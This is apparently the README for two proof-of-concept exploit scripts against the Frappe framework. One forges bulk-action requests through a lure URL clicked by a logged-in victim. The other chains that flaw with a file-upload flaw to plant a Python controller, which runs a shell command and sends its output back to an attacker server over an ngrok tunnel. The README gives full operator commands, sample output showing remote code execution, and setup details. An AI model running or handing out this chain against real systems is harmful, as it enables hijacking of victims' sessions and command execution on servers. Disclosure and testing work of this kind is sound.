# Frappe bulk-action exploits

These attacker-side PoCs implement FRAPPE-06 and the FRAPPE-06 plus FRAPPE-04
command-execution chain. They make persistent changes.

Python 3.10 or later is required. Both scripts use only the standard library.

Each script prints a banner and coloured `[*]`/`[+]`/`[!]`/`[-]` progress to
stderr. `frappe06_bulk_update_get_csrf.py` writes the lure URL to stdout;
`frappe06_04_browser_rce.py` writes the command's `status`, `stdout` and `stderr`
block to stdout and prints its lure URL on stderr. Pass `--no-color` (or set
`NO_COLOR=1`) to disable colour, and see `--help` on either script for a worked
example.

## FRAPPE-06

`frappe06_bulk_update_get_csrf.py` hosts a lure that redirects a victim's click
to Frappe's bulk-action RPC over GET. The browser supplies the victim's existing
`sid` cookie, and no CSRF token is needed.

The victim must already be authenticated and permitted to perform the chosen
action. The attacker needs the DocType and document name. Updates also need a
writable field and a value accepted by the document model. Normal permissions,
validation hooks and workflows still apply.

Host the lure on a site different from the Frappe target:

```console
ngrok http 8000   # in another terminal; use its https URL below
python3 frappe06_bulk_update_get_csrf.py \
  --url https://frappe.example \
  --public-url https://<your-id>.ngrok.io \
  --listen-port 8000 \
  --doctype 'Web Page' \
  --docname about \
  --action update \
  --field title \
  --value 'Maintenance'
```

```text
 [*] target action: update Web Page/about
 [+] lure ready — send this URL to the logged-in victim:
https://1a2b3c4d.ngrok.io/?token=Hk9mPq2rLs
 [*] waiting up to 300s for the victim to follow it
 [+] victim followed the lure; redirect sent to the Frappe endpoint
 [!] the attacker origin cannot read the response; inspect the target document
```

The script prints a random lure URL and waits for the victim to click Continue.
It then redirects the top-level window to the real mutation URL. The attacker
origin can observe that redirect, but the same-origin policy prevents it from
reading the target response or a private document. Check the selected document
separately to determine whether the action succeeded.

`--action` also accepts `submit` and `cancel`. Those actions do not use
`--field`, `--value` or `--value-json`. For updates, `--value-json` sends values
such as numbers, booleans, arrays or `null`.

## FRAPPE-06 plus FRAPPE-04

`frappe06_04_browser_rce.py` uses FRAPPE-06 to replace seven fields on an
existing Web Page and make it a published dynamic page. The stored JavaScript
runs on the Frappe origin, reads the victim's real CSRF token and uploads an
HTML page plus a Python controller through FRAPPE-04. Loading the new route
imports the controller, executes the supplied shell command and sends its exit
status, stdout and stderr back to the attacker server.

The chain requires:

- a victim who can update the selected Web Page;
- the victim to click Continue and allow its user-initiated popup;
- executable Web Page JavaScript and a reachable attacker callback origin;
- a known installed app `www` directory that the web process can write, Python
  can import and the serving worker can see.

Pass that last path in worker-relative form as
`../apps/APP/PYTHON_PACKAGE/www`:

```console
ngrok http 8000   # in another terminal; use its https URL below
python3 frappe06_04_browser_rce.py \
  --url https://frappe.example \
  --public-url https://<your-id>.ngrok.io \
  --listen-port 8000 \
  --web-page landing-page \
  --web-route landing-page \
  --www-path ../apps/custom_app/custom_app/www \
  --command id
```

```text
 [*] execution route: /frappe0604_9c3e1a7f
 [*] payload mode: external
 [+] execution route /frappe0604_9c3e1a7f is unused (HTTP 404)
 [+] lure ready — send this URL to the logged-in victim:
https://1a2b3c4d.ngrok.io/Xy7kP2m/
 [*] waiting up to 300s for the target-origin callback
 [+] target-origin callback received
 [+] remote command exited with status 0
  ------------------------------------------------------------
uid=1000(frappe) gid=1000(frappe) groups=1000(frappe)
```

The execution route is random and cannot be chosen by the operator. Before
serving the lure, the script checks that the route currently returns HTTP 404
so it will not knowingly replace an existing route. After the target-origin
callback arrives, it prints the command's real `status`, `stdout` and `stderr`.

`--payload-mode auto` embeds the payload when the mutation URL is at most 4,000
bytes. For larger payloads it stores a short loader that fetches `payload.js`
from the attacker server. External mode therefore needs the page's script
policy and network path to permit that request.

The chain leaves the selected Web Page modified and creates the random `.html`
and `.py` files printed after command execution.

Nothing is removed automatically. Delete the two printed files first, because
they are what keeps executing, then restore the Web Page fields from your own
record of them. The client rewrites seven fields, so capture the document
before running it if you need to put it back. Confirm the files are gone on the
filesystem rather than by requesting the route, because HTTP 404 does not prove
filesystem absence. Removing the artefacts does not reverse anything the chosen
command already did.

## Browser and TLS behaviour

Frappe's default `SameSite=Lax` session cookie accompanies the top-level
cross-site GET. A Strict cookie blocks this construction. Popup blocking or an
opener-isolating policy can stop the chained sequence.

The command-execution callback runs from the HTTPS Frappe origin, so the
attacker origin has to be HTTPS too or the browser blocks it as mixed content.
The simplest way is a tunnel: run `ngrok http 8000` (or `cloudflared`), pass its
HTTPS URL as `--public-url`, and leave `--certfile` unset so the script serves
plain HTTP behind the tunnel. Supply `--certfile` and `--keyfile` only if you
want the script to terminate TLS itself instead. `--insecure` disables
certificate verification only for the attacker's credential-free
execution-route check.
